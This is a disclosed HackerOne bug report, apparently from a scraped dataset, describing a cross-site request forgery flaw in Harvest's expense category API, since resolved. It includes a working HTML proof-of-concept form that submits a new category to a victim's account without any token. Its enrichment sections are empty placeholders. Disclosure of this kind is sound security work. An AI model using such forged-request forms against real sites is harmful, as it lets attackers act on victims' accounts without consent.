---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '152569'
original_report_id: '152569'
title: Cross-Site Request Forgery (CSRF)
weakness: Cross-Site Request Forgery (CSRF)
team_handle: harvest
created_at: '2016-07-20T14:45:56.574Z'
disclosed_at: '2016-10-13T20:22:30.053Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 22
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Cross-Site Request Forgery (CSRF)

## Metadata

- HackerOne Report ID: 152569
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: harvest
- Disclosed At: 2016-10-13T20:22:30.053Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,
 I Found Cross-Site Request Forgery (CSRF) while  made new Category 

POC :
```
<html>
  <body>
    <form action="https://[any_user_site].harvestapp.com/api/v2/expense_categories" 

method="POST">
      <input type="hidden" name="name" value="[category_name]" />
      <input type="hidden" name="unit&#95;price" value="" />
      <input type="hidden" name="unit&#95;name" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

just put user site and the name of the category on this HTML Form and the category 
will be created to this account.
there is no any token to validate the request here 
so the attacker can use this to made a  CSRF attack to any victim account


__Please Watch My POC I Attached For More Details__

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
